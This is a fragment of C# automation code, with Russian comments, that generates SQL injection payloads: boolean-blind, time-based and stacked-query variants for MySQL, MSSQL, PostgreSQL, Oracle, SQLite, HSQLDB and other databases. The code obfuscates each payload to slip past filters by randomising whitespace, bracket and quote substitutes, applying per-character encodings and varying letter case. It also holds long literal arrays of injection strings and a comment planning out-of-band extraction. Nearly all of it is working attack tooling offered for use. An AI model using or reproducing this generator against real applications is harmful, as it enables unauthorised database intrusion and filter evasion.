			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDSTR]", randStr, "Text", "All");
			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDNUM1]", randNum1, "Text", "All");
			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDNUM2]", randNum2, "Text", "All");
			prepayload = Macros.TextProcessing.Replace(prepayload, "[ORIGVALUE]", queryValue, "Text", "All");


			string prepayload1 = Macros.TextProcessing.Replace(prepayload, "[RANDNUM]", randNum, "Text", "Range", "0,2");//нужно заменять 1 и 3 совпадение
			prepayload1 = Macros.TextProcessing.Replace(prepayload1, "[RANDNUM]", randNum1, "Text", "Range", "0,1");//нужно заменять 2 и 4 совпадение, но меняем 0,1 т.к. уже заменили первые х 
			//prepayload1 = Macros.TextProcessing.Replace(prepayload1, "[RANDNUM1]", randNum1, "Text", "Range", "0,2");//нужно заменять 2 и 4 совпадение

			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDNUM]", randNum, "Text", "All");
			//Case Variation
			payload = Encoder.CaseVariation(prepayload);
			string payload1 = Encoder.CaseVariation(prepayload1);

			//			int strNumArr = boolBlindParReplace.IndexOf[aq];
			//Добавляем в список запрос1 и запрос2 (с которым сравнить нужно будет). Можно много еще пейлоадов нагенериь, но пока этот.
			list.Add(" " + payload + "|SQL_BooleanBlind_parRep+" + aq + "_0");
			list.Add(" " + payload1 + "|SQL_BooleanBlind_parRep+" + aq + "_1");
		}


		for (int awr = 0; awr < boolBlindStacked.Length; awr++)
		{
			prepayload = boolBlindStacked[awr].ToString();
			//prepayload заменяем whitespaces
			int countWhitsp = prepayload.Split(' ').Length - 1;
			for (int i = 0; i < countWhitsp; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(whitespcs.Length);
				string whitSp = whitespcs[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, " ", whitSp, "Text", "First");
			}
			//"("
			int countLeftPar = prepayload.Split('(').Length - 1;
			for (int i = 0; i < countLeftPar; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(lftParent.Length);
				string lftPar = lftParent[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, "(", lftPar, "Text", "First");
			}
			//")"
			int countRightPar = prepayload.Split(')').Length - 1;
			for (int i = 0; i < countRightPar; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(rghtParnt.Length);
				string rgtPar = rghtParnt[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, ")", rgtPar, "Text", "First");
			}
			//"'"
			int countQuote = prepayload.Split('\'').Length - 1;
			for (int i = 0; i < countRightPar; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(quoteTick.Length);
				string quotTick = quoteTick[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, "'", quotTick, "Text", "First");
			}

			//меняем [RANDSTR], [RANDNUM], [RANDNUM1], [RANDNUM2]
			string randStr = Encoder.RandomString(7);
			string randNum = Encoder.RandomNumber(5);
			string randNum1 = Encoder.RandomNumber(5);
			string randNum2 = Encoder.RandomNumber(5);
			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDSTR]", randStr, "Text", "All");
			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDNUM1]", randNum1, "Text", "All");
			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDNUM2]", randNum2, "Text", "All");
			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDNUM]", randNum, "Text", "All");
			//queryValue[ORIGVALUE]
			string prepayload1 = Macros.TextProcessing.Replace(prepayload, "[RANDNUM]=[RANDNUM]", randNum + "=" + randNum1, "Text", "All");
			//проверить эту строку (заменил prepayload на prepayload1)
			prepayload1 = Macros.TextProcessing.Replace(prepayload1, "[RANDNUM]", randNum, "Text", "All");
			//Case Variation
			payload = Encoder.CaseVariation(prepayload);
			string payload1 = Encoder.CaseVariation(prepayload1);

			//			int strNumArr = boolBlindStacked.IndexOf[awr];
			//Добавляем в список запрос1 и запрос2 (с которым сравнить нужно будет). Можно много еще пейлоадов нагенериь, но пока этот.
			list.Add(";" + payload + "|SQL_BooleanBlind_stacked+" + awr + "_0");
			list.Add(";" + payload1 + "|SQL_BooleanBlind_stacked+" + awr + "_1");
		}




		//4. Time Based
		//4.1. Входящие данные

		//общее количество symbolsStart(44)*6(количество dbName) + прочие запросы 96
		for (int xx = 0; xx < symbolsStart.Length; xx++)
		{
			Random rnd = new Random();
			int sleeptime = rnd.Next(60, 91);
			//4.2. Кодируем symbolsStart
			string smbStrt = symbolsStart[xx].ToString();
			char[] array = smbStrt.ToCharArray();
			string final = "";
			StringBuilder strBuild = new StringBuilder();
			for (int yy = 0; yy < array.Length; yy++)
			{
				//еще base64 добавить
				string encodingType =
					Macros.TextProcessing.Spintax("{UTF8|UTF16prc4%|Nibble|DoubleNibble|UrlEncode|||||}");
				var b = array[yy];
				string input = b.ToString();
				if (encodingType.Equals("DoubleNibble"))
				{
					final = Encoder.DoubleNibble(input);
				}
				else if (encodingType.Equals("Nibble"))
				{
					final = Encoder.Nibble(input);
				}
				else if (encodingType.Equals("UTF16prc4"))
				{
					final = Encoder.UTF16prc4(input);
				}
				else if (encodingType.Equals("UTF8"))
				{
					final = Encoder.UTF8(input);
				}
				else if (encodingType.Equals("UrlEncode"))
				{
					final = Encoder.UrlEncode(input);
				}
				else //если без кодировки
				{
					final = input;
				}

				//вариант все символы
				strBuild.Append(final);
			}

			symbolsStartEncoded = strBuild.ToString();

			//4.3. Рандомно берем функцию and or или пусто. Если 
			andOr = Macros.TextProcessing.Spintax("{and|or|&&|!!||||}"); //заменить !! на ||
			if (andOr.Equals("!!"))
			{
				andOr = "||";
			}

			//4.3. В зависимости от DB добавляем Функцию(слип и пр), Коммент в конец, Если and or то Prefixes
			for (int xxx = 0; xxx < dbName.Length; xxx++)
			{
				string dbNm = dbName[xxx].ToString();
				payload = "";

				if (dbNm.Equals("mysql")) // ') or SLEEP(5)--
				{
					//добавляем Функцию
					sleepFunction = "sleep";

					//Если and or то Prefixes добавляем
					if (andOr.Equals("and") || andOr.Equals("or"))
					{
						Random rndm = new Random();
						int rndPrefixes = rndm.Next(0, 9);
						StringBuilder prefToAdd = new StringBuilder();
						for (int i = 0; i < rndPrefixes; i++)
						{
							Random rand = new Random();
							int index = rand.Next(prfxAfterAndOr.Length);
							prefToAdd.Append(prfxAfterAndOr[index]);
						}

						prefixesToAdd = prefToAdd.ToString();
					}

					//Коммент в конец
					Random randr = new Random();
					int inde = randr.Next(commentsEndMySql.Length);
					commentEnd = commentsEndMySql[inde].ToString();

					//Создаем prepayload
					prepayload = symbolsStartEncoded + " " + andOr + " " + prefixesToAdd + sleepFunction + "(" +
					             sleeptime + ")" + " " + commentEnd;
				}
				else if (dbNm.Equals("mssql")) // ")) and waitfor delay '0:0:20' /* 
				{
					//добавляем Функцию
					sleepFunction = "waitfor delay";

					//Если and or то Prefixes добавляем
					if (andOr.Equals("and") || andOr.Equals("or"))
					{
						Random rndm = new Random();
						int rndPrefixes = rndm.Next(0, 9);
						StringBuilder prefTAdd = new StringBuilder();
						for (int i = 0; i < rndPrefixes; i++)
						{
							Random rand = new Random();
							int index = rand.Next(prfxAfterAndOr.Length);
							prefTAdd.Append(prfxAfterAndOr[index]);
						}

						prefixesToAdd = prefTAdd.ToString();
					}

					//Коммент в конец
					Random randr = new Random();
					int inde = randr.Next(commentsEnd.Length);
					commentEnd = commentsEnd[inde].ToString();

					//Создаем prepayload
					prepayload = symbolsStartEncoded + " " + andOr + " " + prefixesToAdd + sleepFunction + " '0:0:" +
					             sleeptime + "' " + " " + commentEnd;

				}

				else if (dbNm.Equals("postgresql")) // ') or pg_SLEEP(5)-- 
				{
					//добавляем Функцию
					sleepFunction = "pg_sleep";

					//Коммент в конец
					Random randr = new Random();
					int inde = randr.Next(commentsEnd.Length);
					commentEnd = commentsEnd[inde].ToString();

					//Создаем prepayload
					prepayload = symbolsStartEncoded + " " + andOr + " " + sleepFunction + "(" + sleeptime + ")" + " " +
					             commentEnd;
				}

				else if (dbNm.Equals("oracle")) // AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 
					//DBMS_LOCK.SLEEP([SLEEPTIME])
				{
					//добавляем Функцию
					sleepFunction = "BEGIN DBMS_LOCK.SLEEP";

					//Коммент в конец
					Random randr = new Random();
					int inde = randr.Next(commentsEnd.Length);
					commentEnd = commentsEnd[inde].ToString();

					//Создаем prepayload
					prepayload = symbolsStartEncoded + " " + andOr + " " + sleepFunction + "(" + sleeptime + ")" + " " +
					             commentEnd;
				}

				else if (dbNm.Equals("sqlite")
					) // OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
					//sqlite3_sleep(1000); 1 sec sleep
				{
					//добавляем Функцию
					sleepFunction = "sqlite3_sleep";

					//Коммент в конец
					Random randr = new Random();
					int inde = randr.Next(commentsEnd.Length);
					commentEnd = commentsEnd[inde].ToString();

					//Создаем prepayload
					prepayload = symbolsStartEncoded + " " + andOr + " " + sleepFunction + "(" + sleeptime + "000)" +
					             " " + commentEnd;
				}

				else if (dbNm.Equals("HSQLDB")
				) // AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)
				{
					//добавляем Функцию
					sleepFunction = "REGEXP_SUBSTRING";

					//Коммент в конец
					Random randr = new Random();
					int inde = randr.Next(commentsEnd.Length);
					commentEnd = commentsEnd[inde].ToString();

					//Создаем prepayload
					prepayload = symbolsStartEncoded + " " + andOr + " " + "'" + Encoder.RandomString(7) +
					             "'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR(" + Encoder.RandomNumber(2) + "),0)," +
					             sleeptime + "000000000),NULL)" + " " + commentEnd;
				}

				//prepayload заменяем whitespaces, "(", ")", "'"
				int countWhitsp = prepayload.Split(' ').Length - 1;
				for (int i = 0; i < countWhitsp; i++)
				{
					Random rndr = new Random();
					int ind = rndr.Next(whitespcs.Length);
					string whitSp = whitespcs[ind].ToString();
					prepayload = Macros.TextProcessing.Replace(prepayload, " ", whitSp, "Text", "First");
				}

				//"("
				int countLeftPar = prepayload.Split('(').Length - 1;
				for (int i = 0; i < countLeftPar; i++)
				{
					Random rndr = new Random();
					int ind = rndr.Next(lftParent.Length);
					string lftPar = lftParent[ind].ToString();
					prepayload = Macros.TextProcessing.Replace(prepayload, "(", lftPar, "Text", "First");
				}

				//")"
				int countRightPar = prepayload.Split(')').Length - 1;
				for (int i = 0; i < countRightPar; i++)
				{
					Random rndr = new Random();
					int ind = rndr.Next(rghtParnt.Length);
					string rgtPar = rghtParnt[ind].ToString();
					prepayload = Macros.TextProcessing.Replace(prepayload, ")", rgtPar, "Text", "First");
				}

				//"'"
				int countQuote = prepayload.Split('\'').Length - 1;
				for (int i = 0; i < countRightPar; i++)
				{
					Random rndr = new Random();
					int ind = rndr.Next(quoteTick.Length);
					string quotTick = quoteTick[ind].ToString();
					prepayload = Macros.TextProcessing.Replace(prepayload, "'", quotTick, "Text", "First");
				}

				payload = Encoder.CaseVariation(prepayload);

				list.Add(payload + "|SQL_Timebased");

			}
		}

		//4.4. Добавляем остальные запросы, но с мин видоизменениями
			string[] expressTimeBased = new string[]
			{
				"AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])", "AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))", "AND SLEEP([SLEEPTIME])", "AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))", "OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])", "OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))", "OR [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))", "PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)", "RLIKE (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])", "RLIKE SLEEP([SLEEPTIME])", "AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))", "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))", "OR [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))", "OR [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))", "AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)", "OR [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7)", "AND [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)", "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])", "OR [RANDNUM]=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)", "OR [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])", "AND [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)", "OR [RANDNUM]=(SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3)", "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))", "OR [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))", "AND [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)", "OR [RANDNUM]=(SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4)", "AND [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)", "OR [RANDNUM]=(SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3)", "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)", "AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)", "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)", "OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)", "AND [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)", "OR [RANDNUM]=(SELECT COUNT(*) FROM SYSMASTER:SYSPAGHDR)"
			};
			for (int aa = 0; aa < expressTimeBased.Length; aa++)
			{
				prepayload = expressTimeBased[aa].ToString();
				//меняем [SLEEPTIME], [RANDSTR], [RANDNUM]
				Random rndrr = new Random();
				string sleeptm = rndrr.Next(60, 91).ToString();
				string randStr = Encoder.RandomString(7);
				string randNum = Encoder.RandomNumber(5);
				prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDSTR]", randStr, "Text", "All");
				prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDNUM]", randNum, "Text", "All");
				prepayload = Macros.TextProcessing.Replace(prepayload, "[SLEEPTIME]", sleeptm, "Text", "All");

				//Коммент в конец
				Random randr = new Random();
				int inde = randr.Next(commentsEnd.Length);
				commentEnd = commentsEnd[inde].ToString();
				prepayload = prepayload + " " + commentEnd;

				//prepayload заменяем whitespaces
				int countWhitsp = prepayload.Split(' ').Length - 1;
				for (int i = 0; i < countWhitsp; i++)
				{
					Random rndr = new Random();
					int ind = rndr.Next(whitespcs.Length);
					string whitSp = whitespcs[ind].ToString();
					prepayload = Macros.TextProcessing.Replace(prepayload, " ", whitSp, "Text", "First");
				}
				//"("
				int countLeftPar = prepayload.Split('(').Length - 1;
				for (int i = 0; i < countLeftPar; i++)
				{
					Random rndr = new Random();
					int ind = rndr.Next(lftParent.Length);
					string lftPar = lftParent[ind].ToString();
					prepayload = Macros.TextProcessing.Replace(prepayload, "(", lftPar, "Text", "First");
				}
				//")"
				int countRightPar = prepayload.Split(')').Length - 1;
				for (int i = 0; i < countRightPar; i++)
				{
					Random rndr = new Random();
					int ind = rndr.Next(rghtParnt.Length);
					string rgtPar = rghtParnt[ind].ToString();
					prepayload = Macros.TextProcessing.Replace(prepayload, ")", rgtPar, "Text", "First");
				}
				//"'"
				int countQuote = prepayload.Split('\'').Length - 1;
				for (int i = 0; i < countRightPar; i++)
				{
					Random rndr = new Random();
					int ind = rndr.Next(quoteTick.Length);
					string quotTick = quoteTick[ind].ToString();
					prepayload = Macros.TextProcessing.Replace(prepayload, "'", quotTick, "Text", "First");
				}
				//Case Variation
				payload = Encoder.CaseVariation(prepayload);
				//Добавляем в список
				list.Add(payload + "|SQL_Timebased");

			}

		//5. Stacked queries (time-based), здесь создам в середину запроса https://jspin.re/fileupload-blind-sqli/
		string[] stackedQueriesArr = new string[]
			{
				"WAITFOR DELAY '0:0:[SLEEPTIME]'", "SELECT SLEEP([SLEEPTIME])", "SELECT PG_SLEEP([SLEEPTIME])", "SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))", "SELECT DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) FROM DUAL", "SELECT COUNT(*) FROM SYSIBM.SYSTABLES AS T1,SYSIBM.SYSTABLES AS T2,SYSIBM.SYSTABLES AS T3", "SELECT COUNT(*) FROM RDB$FIELDS AS T1,RDB$TYPES AS T2,RDB$COLLATIONS AS T3,RDB$FUNCTIONS AS T4", "SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)", "SELECT COUNT(*) FROM DOMAIN.DOMAINS AS T1,DOMAIN.COLUMNS AS T2,DOMAIN.TABLES AS T3", "SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5", "SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))", "CREATE OR REPLACE FUNCTION SLEEP(int) RETURNS int AS '/lib/libc.so.6','sleep' language 'C' STRICT SELECT sleep([SLEEPTIME])", "CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)", "CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)", "BEGIN USER_LOCK.SLEEP([SLEEPTIME])", "BEGIN DBMS_LOCK.SLEEP([SLEEPTIME])", "(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])"
			};//;BEGIN DBMS_LOCK.SLEEP([SLEEPTIME]); END оригинал

		for (int ax = 0; ax < stackedQueriesArr.Length; ax++)
		{
			prepayload = stackedQueriesArr[ax].ToString();
			//меняем [SLEEPTIME], [RANDSTR], [RANDNUM]
			Random rnde = new Random();
			string sleeptime = rnde.Next(60, 91).ToString();
			string randStr = Encoder.RandomString(7);
			string randNum = Encoder.RandomNumber(5);
			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDSTR]", randStr, "Text", "All");
			prepayload = Macros.TextProcessing.Replace(prepayload, "[RANDNUM]", randNum, "Text", "All");
			prepayload = Macros.TextProcessing.Replace(prepayload, "[SLEEPTIME]", sleeptime, "Text", "All");

			//prepayload заменяем whitespaces
			int countWhitsp = prepayload.Split(' ').Length - 1;
			for (int i = 0; i < countWhitsp; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(whitespcs.Length);
				string whitSp = whitespcs[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, " ", whitSp, "Text", "First");
			}
			//"("
			int countLeftPar = prepayload.Split('(').Length - 1;
			for (int i = 0; i < countLeftPar; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(lftParent.Length);
				string lftPar = lftParent[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, "(", lftPar, "Text", "First");
			}
			//")"
			int countRightPar = prepayload.Split(')').Length - 1;
			for (int i = 0; i < countRightPar; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(rghtParnt.Length);
				string rgtPar = rghtParnt[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, ")", rgtPar, "Text", "First");
			}
			//"'"
			int countQuote = prepayload.Split('\'').Length - 1;
			for (int i = 0; i < countRightPar; i++)
			{
				Random rndr = new Random();
				int ind = rndr.Next(quoteTick.Length);
				string quotTick = quoteTick[ind].ToString();
				prepayload = Macros.TextProcessing.Replace(prepayload, "'", quotTick, "Text", "First");
			}
			//Case Variation
			payload = Encoder.CaseVariation(prepayload);
			//Добавляем в список
			list.Add("'+" + payload + "+'" + "|SQL_StackedTime_inside");
			list.Add("'||" + payload + "||'" + "|SQL_StackedTime_inside");
			list.Add("' " + payload + " '" + "|SQL_StackedTime_inside");
			list.Add("\"+" + payload + "+\"" + "|SQL_StackedTime_inside");
			list.Add("\"||" + payload + "||\"" + "|SQL_StackedTime_inside");
			list.Add("\" " + payload + " \"" + "|SQL_StackedTime_inside");
			list.Add("`+" + payload + "+`" + "|SQL_StackedTime_inside");
			list.Add("`||" + payload + "||`" + "|SQL_StackedTime_inside");
			list.Add("` " + payload + " `" + "|SQL_StackedTime_inside");
			list.Add(";" + payload + "|SQL_StackedTime_end");

		}

		//что еще можно доделать:
		//- в Time Based добавить варианты с заменой param value сейчас только по 1 выражению полный цикл + остальные мин видоизменния
		//- в BooleanBlind можно операторы поменять, например, or and && || и пр
		//- OAB добавить (burpcollaborator и пр)



